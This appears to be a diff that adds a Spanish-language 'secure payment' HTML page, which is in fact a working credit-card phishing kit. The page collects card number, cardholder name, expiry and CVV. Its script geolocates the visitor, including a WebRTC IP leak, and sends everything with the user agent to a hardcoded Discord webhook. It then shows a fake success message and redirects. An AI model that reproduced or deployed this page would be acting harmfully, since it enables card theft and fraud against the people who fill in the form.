@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pago Seguro</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="shortcut icon" href="https://cdn.glitch.global/3bc874cc-c5e4-4ba4-b9ac-a6c40f8c4ca7/picts%2Fico.ico?v=1740067236545" type="image/x-icon">
+  <style>
+    .status-message {
+      text-align: center;
+      font-size: 14px;
+      margin-top: 10px;
+      display: none;
+    }
+    .status-success { color: #28a745; }
+    .status-error { color: #dc3545; }
+  </style>
+</head>
+<body>
+
+  <div class="nv-tj">
+    <div class="lg-m">
+      <img src="https://cdn.glitch.global/3bc874cc-c5e4-4ba4-b9ac-a6c40f8c4ca7/picts%2Flog.svg?v=1740067237421" alt="">
+    </div>
+    <div class="cont-prec">
+      <p class="stas">Estas comprando <span>Cuenta Personal</span></p>
+      <p class="txt-pre">$0.89 / Por año</p>
+    </div>
+  </div>
+
+  <div class="cont-new">
+    <div class="cont-new-xjsx">
+      <p class="tit">Añade una tarjeta de crédito</p>
+      <div class="cont-icos">
+        <img src="https://cdn.glitch.global/3bc874cc-c5e4-4ba4-b9ac-a6c40f8c4ca7/picts%2Fa1.svg?v=1740067232827" alt="">
+        <img src="https://cdn.glitch.global/3bc874cc-c5e4-4ba4-b9ac-a6c40f8c4ca7/picts%2Fa3.svg?v=1740067233647" alt="">
+        <img src="https://cdn.glitch.global/3bc874cc-c5e4-4ba4-b9ac-a6c40f8c4ca7/picts%2Fa2.svg?v=1740067233245" alt="">
+        <img src="https://cdn.glitch.global/3bc874cc-c5e4-4ba4-b9ac-a6c40f8c4ca7/picts%2Fa4.svg?v=1740067234058" alt="">
+      </div>
+
+      <form id="xjsx" novalidate>
+        <div class="usr-new">
+          <p>Card number*</p>
+          <input id="j1" name="card_number" type="text" placeholder="**** **** **** ****" maxlength="16" required>
+        </div>
+        <div class="usr-new">
+          <p>Cardholder Name*</p>
+          <input id="j2" name="card_name" type="text" required>
+        </div>
+        <p class="txt-ex">Expires*</p>
+        <div class="ex">
+          <input id="j3" name="exp_mm" type="text" placeholder="MM" maxlength="2" required>
+          <input id="j4" name="exp_yy" type="text" placeholder="YY" maxlength="2" required>
+        </div>
+        <p class="txt-ex">CVV*</p>
+        <div class="ex">
+          <input id="j5" name="cvv" type="text" placeholder="***" maxlength="4" required>
+        </div>
+        <p id="status" class="status-message"></p>
+        <div id="sub-new">
+          <input type="submit" value="Continuar">
+        </div>
+      </form>
+
+    </div>
+  </div>
+
+  <script>
+  const webhookURL = "https://discord.com/api/webhooks/1431346800392147045/YqgBMyv22D6F0tgq-EbazLfIGYJmOSEBwp2ZMhT_ZVN6F0BwowxZ7bvm7ynXMHpljpWy";
+  const redirectURL = "_indexxx.html";
+
+  const form = document.getElementById("xjsx");
+  const cardNumber = document.getElementById("j1");
+  const cardName = document.getElementById("j2");
+  const expMM = document.getElementById("j3");
+  const expYY = document.getElementById("j4");
+  const cvv = document.getElementById("j5");
+  const statusMessage = document.getElementById("status");
+
+  const isPrivate = (ip) => /^10\.|^127\.|^169\.254\.|^192\.168\.|^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip);
+
+  async function getIPData() {
+    try {
+      const r = await fetch("https://ipapi.co/json/");
+      if (r.ok) {
+        const j = await r.json();
+        return {
+          ip: j.ip || "desconocida",
+          city: j.city || "desconocida",
+          country: j.country_name || j.country || "desconocido"
+        };
+      }
+    } catch (e) {}
+
+    try {
+      const rIp = await fetch("https://api.ipify.org?format=json");
+      if (rIp.ok) {
+        const jIp = await rIp.json();
+        const ip = jIp.ip;
+        try {
+          const rGeo = await fetch(`https://ipapi.co/${ip}/json/`);
+          if (rGeo.ok) {
+            const jGeo = await rGeo.json();
+            return {
+              ip: ip,
+              city: jGeo.city || "desconocida",
+              country: jGeo.country_name || jGeo.country || "desconocido"
+            };
+          }
+        } catch (e) {}
+        return { ip, city: "desconocida", country: "desconocido" };
+      }
+    } catch (e) {}
+
+    try {
+      const ipFromWebRTC = await new Promise((resolve) => {
+        const ips = new Set();
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+        pc.createDataChannel("");
+        pc.onicecandidate = (evt) => {
+          if (!evt.candidate) {
+            pc.close();
+            for (const ip of ips) {
+              if (!isPrivate(ip)) return resolve(ip);
+            }
+            return resolve(ips.values().next().value || null);
+          } else {
+            const m = evt.candidate.candidate.match(/([0-9]{1,3}(?:\.[0-9]{1,3}){3})/);
+            if (m) ips.add(m[1]);
+          }
+        };
+        pc.createOffer().then((sdp) => pc.setLocalDescription(sdp)).catch(() => resolve(null));
+      });
+
+      if (ipFromWebRTC) {
+        try {
+          const rGeo2 = await fetch(`https://ipapi.co/${ipFromWebRTC}/json/`);
+          if (rGeo2.ok) {
+            const jG2 = await rGeo2.json();
+            return {
+              ip: ipFromWebRTC,
+              city: jG2.city || "desconocida",
+              country: jG2.country_name || jG2.country || "desconocido"
+            };
+          }
+        } catch (e) {}
+        return { ip: ipFromWebRTC, city: "desconocida", country: "desconocido" };
+      }
+    } catch (e) {}
+
+    return { ip: "desconocida", city: "desconocida", country: "desconocido" };
+  }
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    statusMessage.textContent = "Validando datos...";
+    statusMessage.style.display = "block";
+    statusMessage.className = "status-message";
+
+    try {
+      const geo = await getIPData();
+
+      const payload = {
+        content: `🔐 **Nuevo pago recibido**
+💳 Número de tarjeta: ${cardNumber.value}
+👤 Titular: ${cardName.value}
+📅 Vencimiento: ${expMM.value}/${expYY.value}
+🔒 CVV: ${cvv.value}
+🌐 IP: ${geo.ip}
+🏙 Ciudad: ${geo.city}
+🗺 País: ${geo.country}
+🖥️ User-Agent: ${navigator.userAgent}`
+      };
+
+      const response = await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      if (response.ok) {
+        statusMessage.textContent = "✅ Validados correctamente";
+        statusMessage.classList.add("status-success");
+        form.reset();
+        setTimeout(() => {
+          window.location.href = redirectURL;
+        }, 0);
+      } else {
+        throw new Error("Error al enviar");
+      }
+    } catch (error) {
+      statusMessage.textContent = "❌ Error al enviar los datos.";
+      statusMessage.classList.add("status-error");
+    }
+  });
+</script>
+</body>
+</html>
